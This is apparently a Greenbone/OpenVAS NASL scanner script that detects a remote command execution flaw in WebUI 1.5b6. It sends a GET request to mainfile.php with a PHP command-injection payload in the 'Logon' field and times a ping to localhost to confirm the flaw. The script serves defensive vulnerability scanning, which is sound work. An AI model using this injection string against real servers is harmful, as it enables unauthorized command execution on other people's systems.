if(description){
	script_oid( "1.3.6.1.4.1.25623.1.0.805175" );
	script_version( "2021-04-16T06:57:08+0000" );
	script_tag( name: "cvss_base", value: "7.5" );
	script_tag( name: "cvss_base_vector", value: "AV:N/AC:L/Au:N/C:P/I:P/A:P" );
	script_tag( name: "last_modification", value: "2021-04-16 06:57:08 +0000 (Fri, 16 Apr 2021)" );
	script_tag( name: "creation_date", value: "2015-04-27 17:26:29 +0530 (Mon, 27 Apr 2015)" );
	script_tag( name: "qod_type", value: "remote_analysis" );
	script_name( "WebUI Remote Command Execution Vulnerability" );
	script_tag( name: "summary", value: "The host is installed with WebUI
  and is prone to remote command execution." );
	script_tag( name: "vuldetect", value: "Send a crafted data via HTTP GET request
  and check whether it is able execute system command or not." );
	script_tag( name: "insight", value: "Flaw exists because the 'Logon' parameter
  is not properly sanitized upon submission to the mainfile.php script." );
	script_tag( name: "impact", value: "Successful exploitation will allow remote
  attacker to execute arbitrary command on the affected system." );
	script_tag( name: "affected", value: "WebUI version 1.5b6, Prior versions may
  also be affected." );
	script_tag( name: "solution", value: "No known solution was made available for at least one year since the disclosure of this vulnerability.
Likely none will be provided anymore.
General solution options are to upgrade to a newer release, disable respective features, remove the product or replace the product by another one." );
	script_tag( name: "solution_type", value: "WillNotFix" );
	script_xref( name: "URL", value: "https://www.exploit-db.com/exploits/36821" );
	script_category( ACT_ATTACK );
	script_copyright( "Copyright (C) 2015 Greenbone Networks GmbH" );
	script_family( "Web application abuses" );
	script_dependencies( "find_service.sc", "no404.sc", "webmirror.sc", "DDI_Directory_Scanner.sc", "os_detection.sc", "global_settings.sc" );
	script_require_ports( "Services/www", 80 );
	script_exclude_keys( "Settings/disable_cgi_scanning" );
	exit( 0 );
}
require("http_func.inc.sc");
require("http_keepalive.inc.sc");
require("port_service_func.inc.sc");
require("list_array_func.inc.sc");
require("host_details.inc.sc");
require("os_func.inc.sc");
http_port = http_get_port( default: 80 );
if(!http_can_host_php( port: http_port )){
	exit( 0 );
}
for dir in nasl_make_list_unique( "/", "/webui", http_cgi_dirs( port: http_port ) ) {
	if(dir == "/"){
		dir = "";
	}
	rcvRes = http_get_cache( item: NASLString( dir, "/index.php" ), port: http_port );
	if(ContainsString( rcvRes, ">WebUI" )){
		if( os_host_runs( "Windows" ) == "yes" ){
			ping = "ping%20-n%20";
			wait_extra_sec = 5;
		}
		else {
			ping = "ping%20-c%20";
			wait_extra_sec = 7;
		}
		sleep = make_list( 3,
			 5,
			 7 );
		for sec in sleep {
			url = dir + "/mainfile.php?username=RCE&password=RCE&_login=1" + "&Logon=';echo%20system('" + ping + sec + "%20127.0.0.1');'";
			sndReq = http_get( item: url, port: http_port );
			start = unixtime();
			rcvRes = http_keepalive_send_recv( port: http_port, data: sndReq, bodyonly: FALSE );
			stop = unixtime();
			time_taken = stop - start;
			time_taken = time_taken + 1;
			if(time_taken + 1 < sec || time_taken > ( sec + wait_extra_sec )){
				exit( 0 );
			}
		}
		security_message( port: http_port );
		exit( 0 );
	}
}
exit( 99 );

